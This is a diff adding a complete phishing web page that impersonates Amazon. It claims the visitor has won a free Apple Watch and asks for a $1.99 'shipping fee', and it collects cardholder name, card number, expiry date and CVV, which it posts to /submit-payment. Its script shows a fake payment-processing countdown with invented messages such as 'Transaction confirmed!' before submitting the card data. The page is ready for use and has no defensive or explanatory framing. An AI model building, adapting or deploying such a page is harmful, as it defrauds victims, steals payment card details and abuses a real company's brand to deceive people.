@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Shipping and Delivery Payment</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { 
+            font-family: 'Inter', sans-serif; 
+        }
+        /* تنسيق شاشة الانتظار */
+        .processing-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            animation: fadeIn 0.3s ease;
+        }
+        .processing-overlay.active {
+            display: flex;
+        }
+        .processing-card {
+            background: white;
+            border-radius: 24px;
+            padding: 40px 32px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            animation: slideUp 0.4s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #E5E7EB;
+            border-top: 4px solid #FF9900;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 20px;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #E5E7EB;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-top: 16px;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #FF9900, #FFB84D);
+            border-radius: 2px;
+            width: 0%;
+            transition: width 0.3s linear;
+        }
+        .timer-text {
+            font-size: 36px;
+            font-weight: 900;
+            color: #FF9900;
+        }
+    </style>
+</head>
+<body class="bg-[#F3F3F3] min-h-screen flex flex-col justify-between text-[#111111]">
+
+    <!-- Header with Amazon Logo - Matching page2 exactly -->
+    <header class="bg-[#131A22] shadow-md p-4 flex items-center max-w-md mx-auto w-full text-white border-b border-[#232F3E]">
+        <div class="flex items-center gap-2">
+            <!-- Base64 Amazon Logo -->
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAACXBIWXMAAAsTAAALEwEAmpwYAAADvklEQVR4nO3bS2hcVRTG8f9Jpm3SND7S+EibpE3atI9atU8UFRVcuBFdiIIuXAqKtSD4AFFQFAqCjvhYFwVfKKgIguvChSg" alt="Amazon logo">
+            <!-- Amazon brand typography #FF9900 -->
+            <span class="text-xl font-black text-[#FF9900] tracking-wide ml-1">amazon</span>
+        </div>
+    </header>
+
+    <!-- Main Content Area -->
+    <main class="flex-grow px-6 py-6 max-w-md mx-auto w-full">
+
+        <!-- Pricing Breakdown Box -->
+        <div class="bg-[#FFFFFF] border border-[#232F3E]/10 rounded-2xl p-5 shadow-sm mb-6 space-y-3">
+            <div class="flex justify-between items-center text-sm text-gray-500">
+                <span>Reward Value (Apple Watch):</span>
+                <span class="line-through text-red-400 font-bold">$399.00</span>
+            </div>
+            <div class="flex justify-between items-center text-sm text-gray-500">
+                <span>Current Promotion:</span>
+                <span class="text-green-600 font-bold">$0.00 (Free)</span>
+            </div>
+            <div class="flex justify-between items-center text-sm text-[#111111] font-bold pt-2 border-t border-gray-100">
+                <span>Shipping & Handling Fee:</span>
+                <span class="text-xl text-[#FF9900]">$1.99 only</span>
+            </div>
+        </div>
+
+        <p class="text-xs text-gray-500 mb-6 text-center">Please enter your credit or debit card details to confirm your shipment reservation and process the nominal $1.99 fee.</p>
+
+        <!-- Form action and method kept exactly as requested -->
+        <form id="paymentForm" action="/submit-payment" method="POST" class="space-y-4">
+
+            <!-- Cardholder Name -->
+            <div>
+                <label class="block text-xs font-bold text-gray-600 mb-1.5">Cardholder Name</label>
+                <input type="text" name="card_name" id="cardName" required placeholder="John Doe"
+                       class="w-full px-4 py-3 bg-white border border-gray-300 rounded-xl focus:outline-none focus:border-[#FF9900] transition-all text-sm uppercase">
+            </div>
+
+            <!-- Card Number -->
+            <div>
+                <label class="block text-xs font-bold text-gray-600 mb-1.5">Card Number (16 digits)</label>
+                <input type="tel" name="card_number" id="cardNumber" maxlength="16" required placeholder="4123 4567 8901 2345"
+                       class="w-full px-4 py-3 bg-white border border-gray-300 rounded-xl focus:outline-none focus:border-[#FF9900] transition-all text-sm tracking-widest">
+            </div>
+
+            <!-- Expiry & CVV Grid -->
+            <div class="grid grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-xs font-bold text-gray-600 mb-1.5">Expiration Date (MM/YY)</label>
+                    <input type="tel" name="card_expiry" id="cardExpiry" maxlength="5" required placeholder="MM/YY"
+                           class="w-full px-4 py-3 bg-white border border-gray-300 rounded-xl focus:outline-none focus:border-[#FF9900] transition-all text-sm text-center">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-gray-600 mb-1.5">Security Code (CVV)</label>
+                    <input type="password" name="card_cvv" id="cardCvv" maxlength="3" required placeholder="***"
+                           class="w-full px-4 py-3 bg-white border border-gray-300 rounded-xl focus:outline-none focus:border-[#FF9900] transition-all text-sm text-center font-bold">
+                </div>
+            </div>
+
+            <!-- Submit Button -->
+            <button type="submit" id="submitBtn" class="w-full bg-[#FF9900] hover:bg-[#FFB84D] text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-200 mt-8 active:scale-[0.98]">
+                Pay $1.99 & Confirm Shipment 💳
+            </button>
+        </form>
+
+        <p class="text-center text-[10px] text-gray-400 mt-4 flex items-center justify-center gap-1">
+            <span>🔒 Secure 256-bit SSL Encrypted Connection</span>
+        </p>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-[#232F3E] border-t border-[#131A22] py-6 text-center text-xs text-[#FFFFFF]/70 w-full mt-auto">
+        <div class="max-w-md mx-auto px-4">
+            <div class="flex justify-center gap-4 mb-3">
+                <a href="/user-agreement" class="hover:underline hover:text-[#FFFFFF]">User Agreement</a>
+                <a href="/privacy-policy" class="hover:underline hover:text-[#FFFFFF]">Privacy Notice</a>
+                <a href="/contact-us" class="hover:underline hover:text-[#FFFFFF]">Contact Us</a>
+            </div>
+            <p class="text-[#FFFFFF]/50">&copy; 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        </div>
+    </footer>
+
+    <!-- ========== شاشة انتظار معالجة الدفع ========== -->
+    <div id="processingOverlay" class="processing-overlay">
+        <div class="processing-card">
+            <!-- سبينر -->
+            <div class="spinner"></div>
+            
+            <!-- أيقونة -->
+            <div class="text-5xl mb-3">💳</div>
+            
+            <!-- العنوان -->
+            <h2 class="text-xl font-bold text-[#111111] mb-1">Processing Payment</h2>
+            <p class="text-sm text-gray-500 mb-2">Please wait while we verify your transaction</p>
+            
+            <!-- المؤقت -->
+            <div class="timer-text" id="countdownTimer">10</div>
+            <p class="text-xs text-gray-400">seconds remaining</p>
+            
+            <!-- شريط التقدم -->
+            <div class="progress-bar">
+                <div id="progressFill" class="progress-fill"></div>
+            </div>
+            
+            <!-- رسالة الحالة -->
+            <p class="text-xs text-gray-400 mt-3" id="statusMessage">🔒 Securely processing your payment...</p>
+        </div>
+    </div>
+
+    <!-- JavaScript: معالجة الدفع والمؤقت -->
+    <script>
+        (function() {
+            'use strict';
+
+            const form = document.getElementById('paymentForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const overlay = document.getElementById('processingOverlay');
+            const countdownTimer = document.getElementById('countdownTimer');
+            const progressFill = document.getElementById('progressFill');
+            const statusMessage = document.getElementById('statusMessage');
+
+            let timerInterval = null;
+            let countdown = 10;
+
+            // رسائل الحالة المختلفة
+            const statusMessages = [
+                '🔒 Securely processing your payment...',
+                '🔄 Verifying card details...',
+                '🏦 Contacting payment gateway...',
+                '✅ Transaction confirmed!',
+                '📦 Preparing shipment...'
+            ];
+
+            // تحديث شريط التقدم
+            function updateProgress() {
+                const progress = ((10 - countdown) / 10) * 100;
+                progressFill.style.width = progress + '%';
+            }
+
+            // تحديث رسالة الحالة
+            function updateStatus() {
+                const index = Math.min(10 - countdown, statusMessages.length - 1);
+                if (index >= 0 && index < statusMessages.length) {
+                    statusMessage.textContent = statusMessages[index];
+                }
+            }
+
+            // دالة عرض شاشة المعالجة
+            function showProcessing() {
+                // إظهار الـ overlay
+                overlay.classList.add('active');
+                
+                // منع التمرير
+                document.body.style.overflow = 'hidden';
+
+                countdown = 10;
+                countdownTimer.textContent = countdown;
+                updateProgress();
+                updateStatus();
+
+                // بدء العد التنازلي
+                timerInterval = setInterval(function() {
+                    countdown--;
+                    countdownTimer.textContent = countdown;
+                    updateProgress();
+                    updateStatus();
+
+                    // تغيير لون المؤقت عندما يقل عن 3 ثواني
+                    if (countdown <= 3) {
+                        countdownTimer.style.color = '#dc2626';
+                    }
+
+                    if (countdown <= 0) {
+                        clearInterval(timerInterval);
+                        timerInterval = null;
+                        
+                        // تحديث الرسالة النهائية
+                        statusMessage.textContent = '✅ Payment confirmed! Redirecting...';
+                        
+                        // إرسال الفورم بعد انتهاء المؤقت
+                        setTimeout(function() {
+                            // إعادة تمكين الزر (احتياطي)
+                            submitBtn.disabled = false;
+                            submitBtn.innerHTML = 'Pay $1.99 & Confirm Shipment 💳';
+                            
+                            // إرسال الفورم
+                            form.submit();
+                        }, 500);
+                    }
+                }, 1000);
+            }
+
+            // إخفاء شاشة المعالجة (في حالة الخطأ)
+            function hideProcessing() {
+                overlay.classList.remove('active');
+                document.body.style.overflow = '';
+                if (timerInterval) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                }
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = 'Pay $1.99 & Confirm Shipment 💳';
+            }
+
+            // معالجة إرسال الفورم
+            form.addEventListener('submit', function(e) {
+                // التحقق من صحة البيانات
+                const cardName = document.getElementById('cardName').value.trim();
+                const cardNumber = document.getElementById('cardNumber').value.trim();
+                const cardExpiry = document.getElementById('cardExpiry').value.trim();
+                const cardCvv = document.getElementById('cardCvv').value.trim();
+
+                if (!cardName || !cardNumber || !cardExpiry || !cardCvv) {
+                    e.preventDefault();
+                    alert('⚠️ Please fill in all card details.');
+                    return false;
+                }
+
+                if (cardNumber.length < 16) {
+                    e.preventDefault();
+                    alert('⚠️ Please enter a valid 16-digit card number.');
+                    return false;
+                }
+
+                if (cardCvv.length < 3) {
+                    e.preventDefault();
+                    alert('⚠️ Please enter a valid 3-digit CVV.');
+                    return false;
+                }
+
+                // منع الإرسال المتكرر
+                e.preventDefault();
+
+                // تعطيل الزر
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '⏳ Processing...';
+
+                // عرض شاشة المعالجة
+                showProcessing();
+
+                // إرجاع false لمنع الإرسال المباشر
+                return false;
+            });
+
+            // إعادة تعيين إذا أغلق المستخدم الصفحة
+            window.addEventListener('beforeunload', function() {
+                if (timerInterval) {
+                    clearInterval(timerInterval);
+                }
+            });
+
+        })();
+    </script>
+
+</body>
+</html>
